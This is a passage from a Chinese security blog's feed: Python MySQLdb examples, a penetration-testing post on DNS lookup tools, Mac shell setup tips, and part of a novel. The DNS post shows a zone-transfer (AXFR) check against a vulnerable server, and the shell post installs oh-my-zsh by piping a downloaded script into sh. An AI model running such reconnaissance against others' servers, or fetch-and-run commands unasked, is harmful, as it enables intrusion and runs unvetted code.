<p>连接mysql数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">conn=MySQLdb.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"test"</span>,charset=<span class="string">"utf8"</span>,connect_timeout=10)  <span class="comment">#connec_timeout连接超时时间  </span></div><div class="line">cursor = conn.cursor()</div></pre></td></tr></table></figure></p>
<p>创建表结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"create table if not exists user(name varchar(128) primary key, created int(10))"</span>  </div><div class="line">cursor.execute(sql)</div></pre></td></tr></table></figure></p>
<p>往表中写入数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"insert into user(name,created) values(%s,%s)"</span>     </div><div class="line">param = (<span class="string">"aaa"</span>,int(time.time()))      </div><div class="line">n = cursor.execute(sql,param)      </div><div class="line">cursor.close()</div><div class="line">conn.commit()    <span class="comment">#必须要commit，不然数据只会缓存在本地，而不会真正的插入数据库</span></div></pre></td></tr></table></figure></p>
<p>往表中写入多行数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"insert into user(name,created) values(%s,%s)"</span>     </div><div class="line">param = ((<span class="string">"bbb"</span>,int(time.time())), (<span class="string">"ccc"</span>,33), (<span class="string">"ddd"</span>,44) )  </div><div class="line">n = cursor.executemany(sql,param)</div></pre></td></tr></table></figure></p>
<p>更新表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"update user set name=%s where name='aaa'"</span>     </div><div class="line">param = (<span class="string">"zzz"</span>)      </div><div class="line">n = cursor.execute(sql,param)</div></pre></td></tr></table></figure></p>
<p>查询表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">n = cursor.execute(<span class="string">"select * from user"</span>)      </div><div class="line"><span class="keyword">for</span> row <span class="keyword">in</span> cursor.fetchall():      </div><div class="line">    <span class="built_in">print</span> row  </div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> row:      </div><div class="line">        <span class="built_in">print</span> r</div></pre></td></tr></table></figure></p>
<p>删除表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"delete from user where name=%s"</span>     </div><div class="line">param =(<span class="string">"bbb"</span>)      </div><div class="line">n = cursor.execute(sql,param)</div></pre></td></tr></table></figure></p>
<p>删除表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"drop table if exists user"</span>  </div><div class="line">cursor.execute(sql)</div></pre></td></tr></table></figure></p>
<p>提交commit<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">conn.commit()</div></pre></td></tr></table></figure></p>
<p>关闭连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">conn.close()</div></pre></td></tr></table></figure></p>
<h3 id="Python操作mysql优化问题"><a href="#Python操作mysql优化问题" class="headerlink" title="Python操作mysql优化问题"></a>Python操作mysql优化问题</h3><p>1、commit操作放在最后，或者循环外面<br>2、使用executemany，插入多条数据</p>
<h2 id="时间墙"><a href="#时间墙" class="headerlink" title="时间墙"></a>时间墙</h2><p>@2017.07.28　　添加mysql权限问题内容<br>@2017.07.29　　添加mysql基础命令、mysql性能优化、python操作mysql</p>
<p><em>本文将会持续添加mysql有关的问题</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Take control of your own desting&lt;br&gt;命运掌握在自己手上&lt;/blockquote&gt;&lt;br&gt;　　最近由于项目需要，特地研究了下mysql数据库。虽然大学期间曾学习过mysql，但由于之前开发一直用rethinkdb以及mongodb数据库，因此对mysql已经有些生疏了。最近在使用期间也遇到了很多坑，但幸好最终还是靠着强大的Google解决了所有问题。因此在此记录下mysql相关问题的一些笔记，其中可能会涉及Mysql安全相关的问题，比如利用mysql导出shell、mysql提权等，权当备份。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="mysql" scheme="http://thief.one/tags/mysql/"/>
    
      <category term="数据库" scheme="http://thief.one/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>【渗透神器系列】DNS信息查询</title>
    <link href="http://thief.one/2017/07/12/1/"/>
    <id>http://thief.one/2017/07/12/1/</id>
    <published>2017-07-12T08:29:12.000Z</published>
    <updated>2017-08-01T12:19:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Never put off what you can do today until tomorrow<br>今日事今日毕</blockquote><br>　　好久没有写文章啦，最近忙着换工作，搞事情，麻烦事一大推，凑空整理一篇DNS信息查询等工具用法吧。DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。因此，学会一些工具快速查询检测DNS服务器状况显得尤为重要，本篇就介绍几款常见的DNS信息查询工具。<br><a id="more"></a></p>
<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>　　nslookup是用来监测网络中DNS服务器是否可以实现域名解析的工具，简单来说可以获取域名对应的ip。与ping的区别在于，nslookup返回的结果更丰富，而且主要针对dns服务器的排错，收集dns服务器的信息。（其实ping的过程也去请求了dns的记录，然后对ip发送icmp数据包）</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><h5 id="非交互式（直接在shell中输入查询）："><a href="#非交互式（直接在shell中输入查询）：" class="headerlink" title="非交互式（直接在shell中输入查询）："></a>非交互式（直接在shell中输入查询）：</h5><p>查询thief.one域名对应的ip，这里指定了前往114.114.114.114－dns服务器进行查询。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup thief.one 114.114.114.114</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/3.png" alt=""><br>查询thief.one域名DNS服务商。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup -<span class="built_in">type</span>=ns thief.one</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/1.png" alt=""><br>查询thief.one的邮件服务器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup -<span class="built_in">type</span>=mx thief.one</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/2.png" alt=""></p>
<h5 id="交互式（先输入nslookup，然后再输入命令）："><a href="#交互式（先输入nslookup，然后再输入命令）：" class="headerlink" title="交互式（先输入nslookup，然后再输入命令）："></a>交互式（先输入nslookup，然后再输入命令）：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<p>进入交互式界面，输入查询命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=a              <span class="comment">#设置更改要查询的dns解析类型</span></div><div class="line">&gt;thief.one               <span class="comment">#输入要查询的域名</span></div><div class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=mx             <span class="comment">#设置更改要查询的dns解析类型</span></div><div class="line">&gt;thief.one</div><div class="line">&gt;server 114.114.114.114  <span class="comment">#设置更改要查询的dns服务器地址</span></div><div class="line">&gt;ls thief.one <span class="comment">#ls命令列出某个域中的所有域名</span></div></pre></td></tr></table></figure></p>
<p>可以更改的type类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-A    <span class="comment">#A记录</span></div><div class="line">-AAAA</div><div class="line">-CNAME <span class="comment">#CNAME纪录</span></div><div class="line">-HINFO</div><div class="line">-MB</div><div class="line">-MG</div><div class="line">-MR</div><div class="line">-MX <span class="comment">#电子邮件交换记录，记录一个邮件域名对应的IP地址</span></div><div class="line">-NS <span class="comment">#域名服务器记录,记录该域名由哪台域名服务器解析</span></div><div class="line">-PTR <span class="comment">#反向记录,也即从IP地址到域名的一条记录</span></div><div class="line">-TXT <span class="comment">#记录域名的相关文本信息</span></div></pre></td></tr></table></figure></p>
<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p>与nslookup类似，也是查询域名对应的dns信息。</p>
<h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host -t A thief.one</div></pre></td></tr></table></figure>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>-a：显示详细的DNS信息； </li>
<li>-c&lt;类型&gt;：指定查询类型，默认值为“IN“； </li>
<li>-C：查询指定主机的完整的SOA记录； </li>
<li>-r：在查询域名时，不使用递归的查询方式； </li>
<li>-t&lt;类型&gt;：指定查询的域名信息类型； </li>
<li>-v：显示指令执行的详细信息； </li>
<li>-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答； </li>
<li>-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令； </li>
<li>-4：使用IPv4； host </li>
<li>-6：使用IPv6.</li>
</ul>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><h4 id="Usage-2"><a href="#Usage-2" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dig thief.one mx</div><div class="line">dig thief.one ns</div><div class="line">dig @202.106.0.20 thief.one a  指定dns服务器</div><div class="line">dig thief.one a +tcp  设置为tcp协议，默认为udp</div><div class="line">dig thief.one a +trace 这个参数之后将显示从根域逐级查询的过程</div></pre></td></tr></table></figure>
<p>若<em><a href="http://thief.one">http://thief.one</a></em>的DNS服务器为10.0.0.1，且存在域传送漏洞，则使用dig @10.0.0.1 <a href="http://thief.one">http://thief.one</a> axfr即可查看所有域名了。</p>
<h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><ul>
<li>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器； </li>
<li>-b：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；</li>
<li>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息； </li>
<li>-P：指定域名服务器所使用端口号； </li>
<li>-t&lt;类型&gt;：指定要查询的DNS数据类型； </li>
<li>-x：执行逆向域名查询； </li>
<li>-4：使用IPv4； </li>
<li>-6：使用IPv6； </li>
<li>-h：显示指令帮助信息。</li>
</ul>
<h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>whois用来查询域名相关信息，比如注册人信息，电子邮件，域名提供商，ip信息等等。</p>
<h4 id="Usage-3"><a href="#Usage-3" class="headerlink" title="Usage"></a>Usage</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -p port thief.one</div></pre></td></tr></table></figure>
<p>更多用法可以使用<em>man whois</em>查看。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/08/01/1/">【渗透神器系列】Metasploit</a><br><a href="http://thief.one/2017/04/10/1/">【渗透神器系列】nc</a><br><a href="http://thief.one/2017/05/02/1/">【渗透神器系列】nmap</a><br><a href="http://thief.one/2017/04/27/1">【渗透神器系列】Fiddler</a><br><a href="http://thief.one/2017/05/19/1">【渗透神器系列】搜索引擎</a><br><a href="http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">【渗透神器系列】WireShark</a></p>
<p>DNS信息在线查询的网站很多，可以参考下：<a href="https://thief.one/SecWeb">SecWeb安全导航</a>另外网上类似的文章很多很多啦，大家可以全去搜索下，这里只是列举了一些常见的工具，若有好的后面会持续补充。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Never put off what you can do today until tomorrow&lt;br&gt;今日事今日毕&lt;/blockquote&gt;&lt;br&gt;　　好久没有写文章啦，最近忙着换工作，搞事情，麻烦事一大推，凑空整理一篇DNS信息查询等工具用法吧。DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。因此，学会一些工具快速查询检测DNS服务器状况显得尤为重要，本篇就介绍几款常见的DNS信息查询工具。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透神器" scheme="http://thief.one/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    
      <category term="DNS" scheme="http://thief.one/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>定制化MacShell</title>
    <link href="http://thief.one/2017/06/27/1/"/>
    <id>http://thief.one/2017/06/27/1/</id>
    <published>2017-06-27T02:17:09.000Z</published>
    <updated>2017-07-31T02:30:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Keep on going never give up！<br>勇往直前，决不放弃！</blockquote><br>　　黑苹果用了将近半年，我也开始慢慢熟悉使用mac操作系统。然而之前我并没有真正发挥出mac高效率的一面，而只是停留于最基础的使用，为了能更高效的使用mac，近期我搜集了一些高效优雅地使用mac的案例，准备实操一番并做些记录。<br>　　如何高效地使用Mac？面对这个问题，我们可以从如何优雅地使用shell（也就是终端）开始探讨。首先不得不说mac自带的shell功能已经很强大了，但为了更好地办公，我们能做得还有很多。本篇将介绍几款Mac下shell增强工具（插件），使得Macshell的功能更加强大。<br><a id="more"></a></p>
<h3 id="iterm2"><a href="#iterm2" class="headerlink" title="iterm2"></a>iterm2</h3><p>安装比较简单，官网下载一个安装包即可。</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>智能选中：</p>
<ul>
<li>双击选中字符串；</li>
<li>三击选中整行；</li>
<li>四击智能选中；</li>
</ul>
<p>按住⌘键：</p>
<ul>
<li>可以拖拽选中的字符串；</li>
<li>点击url，调用默认浏览器访问该网址；</li>
</ul>
<p>快捷键：</p>
<ul>
<li>切换tab：⌘+←, ⌘+→, ⌘+{, ⌘+}；⌘+数字直接定位到该tab；</li>
<li>新建tab：⌘+t；</li>
<li>顺序切换 pane：⌘+[, ⌘+]；</li>
<li>按方向切换 pane：⌘+Option+方向键；</li>
<li>切分屏幕：⌘+d水平切分，⌘+Shift+d垂直切分；</li>
<li>智能查找，支持正则查找：⌘+f；</li>
<li>自动补齐，按⌘+;；</li>
<li>弹出历史记录窗口，按⌘+Shift+h；</li>
<li>找到当前鼠标，⌘+/；</li>
</ul>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh my zsh"></a>oh my zsh</h3><p>　　我们平常在mac上使用的shell通常都是bash-shell，而mac以及linux有另一款自带的shell异常强大，它就是zsh-shell。bash-shell的配置通常可以在用户目录下.bash_profile文件内设置，而zsh-shell同样可以在用户目录下.zshrc文件内设置。<br>　　由于zsh-shell是完全可定制化的，因此出现了一款开源工具–oh my zsh，它是一个开源的、社区驱动的框架，用来管理ZSH配置。</p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="external">https://github.com/robbyrussell/oh-my-zsh</a><br><a href="http://ohmyz.sh" target="_blank" rel="external">http://ohmyz.sh</a></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></div></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></div></pre></td></tr></table></figure></p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>切换到zsh-shell，可以通过命令行输入zsh进行查看。<br><img src="/upload_image/20170627/1.png" alt=""><br>或者设置shell启动开启zsh而不是bash：<br><img src="/upload_image/20170627/2.png" alt=""><br>oh-my-zsh有许多插件和主题，可以去 ~/.zshrc 配置。</p>
<h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h3><p>autojump是一款可以快速切换到指定目录的shell插件，支持模糊匹配，tab补全等功能。</p>
<h4 id="项目地址-1"><a href="#项目地址-1" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/wting/autojump" target="_blank" rel="external">https://github.com/wting/autojump</a></p>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install autojump</div></pre></td></tr></table></figure>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>安装完以后终端直接输入autojump，如果没有报错，则说明安装成功。<br>如果遇到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">please <span class="built_in">source</span> the correct autojump file <span class="keyword">in</span> your shell\<span class="string">'s startup file.</span></div></pre></td></tr></table></figure></p>
<p>则将以下内容添加到~/.zshrc文件末尾：（安装完oh my zsh会在用户目录下出现一个.zshrc文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ -f /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh</div></pre></td></tr></table></figure></p>
<p>然后设置.zshrc文件中的plugins=(git autojump)。<br>配置完以后在终端输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> .zshrc</div></pre></td></tr></table></figure></p>
<p>用来启用.zshrc配置，或者注销用户重启shell来生效。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">j 关键字</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170627/3.png" alt=""><br>注意：只有曾经访问过的目录，才能用autojump快速进入。</p>
<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h3><p>这是一款可提示历史命令的shell插件。</p>
<h4 id="项目地址-2"><a href="#项目地址-2" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/zsh-users/zsh-autosuggestions" target="_blank" rel="external">https://github.com/zsh-users/zsh-autosuggestions</a></p>
<h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions</div></pre></td></tr></table></figure>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>vim .zshrc写入以下内容:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh</div></pre></td></tr></table></figure></p>
<p>配置完以后在终端输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> .zshrc</div></pre></td></tr></table></figure></p>
<p>启用.zshrc配置，或者注销用户重启shell来生效。</p>
<h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/4.png" alt=""></p>
<h3 id="icdiff"><a href="#icdiff" class="headerlink" title="icdiff"></a>icdiff</h3><p>diff的美化增强版，文件差异对比工具。</p>
<h4 id="项目地址-3"><a href="#项目地址-3" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/jeffkaufman/icdiff" target="_blank" rel="external">https://github.com/jeffkaufman/icdiff</a></p>
<h4 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install git+https://github.com/jeffkaufman/icdiff.git</div></pre></td></tr></table></figure>
<h4 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/5.png" alt=""></p>
<h3 id="httpie"><a href="#httpie" class="headerlink" title="httpie"></a>httpie</h3><p>curl美化版，格式化输出结果。</p>
<h4 id="项目地址-4"><a href="#项目地址-4" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/jakubroztocil/httpie/" target="_blank" rel="external">https://github.com/jakubroztocil/httpie/</a></p>
<h4 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install httpie</div></pre></td></tr></table></figure>
<h4 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h4><p><img src="/upload_image/20170627/6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Keep on going never give up！&lt;br&gt;勇往直前，决不放弃！&lt;/blockquote&gt;&lt;br&gt;　　黑苹果用了将近半年，我也开始慢慢熟悉使用mac操作系统。然而之前我并没有真正发挥出mac高效率的一面，而只是停留于最基础的使用，为了能更高效的使用mac，近期我搜集了一些高效优雅地使用mac的案例，准备实操一番并做些记录。&lt;br&gt;　　如何高效地使用Mac？面对这个问题，我们可以从如何优雅地使用shell（也就是终端）开始探讨。首先不得不说mac自带的shell功能已经很强大了，但为了更好地办公，我们能做得还有很多。本篇将介绍几款Mac下shell增强工具（插件），使得Macshell的功能更加强大。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Mac" scheme="http://thief.one/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>【原创小说】刺青</title>
    <link href="http://thief.one/2017/06/22/1/"/>
    <id>http://thief.one/2017/06/22/1/</id>
    <published>2017-06-22T08:51:30.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">用刺青，刻下凄美的伤疤，无法抹去，深入骨髓</blockquote><br>　　怀旧原创小说三部曲，这是最后一篇了，相信我，发完这篇我不会再发小说，是时候该好好研究研究技术了，不能整天不务正业。<br><a id="more"></a></p>
<p><center><img src="/upload_image/20170622/1.jpg" alt=""></center></p>
<h3 id="1-0］"><a href="#1-0］" class="headerlink" title="[1.0］"></a>[1.0］</h3><p>　　刺青，是用带有颜色的针刺入皮肤底层而在皮肤上制造一些图案或字眼出来，代表着个性或者某种身份。<br>　　在一般人看来，身上如若刻上刺青，则刺青背后一定隐藏着一段不可告人的秘密。很不幸的是，从我记事起，我左手臂上就刻有莲花刺青，而我可以对天发誓，我完全不知道，这块抹不去的刺青到底蕴藏着什么秘密。为了能解开刺青的奥秘，每当与梅生裸身泡在清溪中时，我必定用手指戳一戳梅生手臂上的莲花刺青，然后直勾着眼问：“梅哥，你说我俩手臂上的莲花刺青，到底蕴藏着啥秘密啊？难不曾是藏宝地图！”。<br>　　梅生慵懒地打着哈欠，很不耐烦地说道：“我说阿青，你都问了第九百九十九次了，你不烦我还烦呢！”，说完嫌弃地瞥了我一眼，仰天躺在清溪中呼呼大睡起来。<br>　　我气得连滚带爬上了河岸，从裤腰带里拔出一把小刀，对着河中的梅生喊道：“你再不说，我就把手臂上的莲花削去”。我心想吓唬吓唬他，凭借着我们从小共用一条裤腰带的交情，想必他也不会这么无情。不过随后我就发现，这只是我一厢情愿，梅生的呼噜声更响了，显然掩盖了我的叫喊。我灵机一动，拿起梅生的衣服就往家跑。当我回望着清溪，梅生已经赤裸着身子站在岸边，用水草遮掩私处，嘴里骂道：“刺青，你这个混蛋！”。<br>　　随后，在我日复一日的纠缠下，梅生终于说出了莲花刺青的秘密，结果却让我失望之极。他说，二十年前我们被一伙人贩子拐卖到风莲国，为了防止我们逃跑，他们请刺青师在我们身上刻下了相同的莲花刺青,后来因为战乱我俩逃了出来，从此相依为命。原本我是不相信梅生的鬼话的，可谁让他虚长我十岁呢，况且在我记忆里，儿时的生活就是与梅生一起的。更何况，看见他满脸可怜相，两眼汪汪地望着我，如同他第一次叫我刺青时，看我的眼神，让我不得不信。<br>　　二十年前，当我与梅生首次踏入风莲国，梅生奸笑着用他迷离的眼神盯着我说：“我们以后就要在此生活了，从现在开始，你就叫刺青，而我叫梅生”，我傻不啦叽地点了点头。如今，每每回想起此事，我都后悔不已，曾今的年少无知，让我被人叫了二十年的刺青。当我受不了别人的嘲讽，终于有一天把刀架在梅生的脖子上时，梅生委屈地从眼中挤出几滴泪，三言两语地说服了我，“你手臂刻有的刺青，就如同你的名字将伴随你一生，我是顺应天意也”。也许，我是真的太傻太天真，竟然相信了他的鬼话，全然没想到他手臂上的刺青与我分毫不差。<br>　　直到我赚到了第一桶金，我不得不相信梅生嘴中的天意。谁让我选择了刺客这条不归路呢，由此又是伴随我生命中一个刺字。刺客这个行当，看似潇洒，实则是哑巴吃黄连，有苦说不出啊，名副其实的高风险职业，不像戏子梅生那么清闲自在。每个月黑风高的夜晚，当梅生在舞台上摆弄着身姿，炫耀着腔调，我却游走于风口浪尖，潜入深门高墙之内。同样是化妆，梅生化得光彩照人，为的是吸引眼球，而我只需一席黑衣，一块面纱，为的是避人耳目。<br>　　每次筋疲力竭地回到家，看着梅生对着铜镜摆弄着身姿，我都不由一阵恶心。以至于，我采了无数的荷花叶，每晚对着莲花刺青反复涂搽，心想只要抹去了刺青，我就能摆脱天意，摆脱这种生活。谁知没等我看到希望，梅生便向我心头泼了盆冷水。他说，用刺青，刻下凄美的伤疤，无法抹去，深入骨髓。<br>　　我气得全身发抖，随即把他狠狠地揍了一顿，指着他的鼻子说：“我的伤疤只有凄凉，你的全是美丽，我俩一起才是凄美”。梅生摸着乌青的脸颊，指着愤然离去的我，说：“臭小子，让你别打脸，你让我拿什么混饭吃，你有种，晚上别回来了！”。</p>
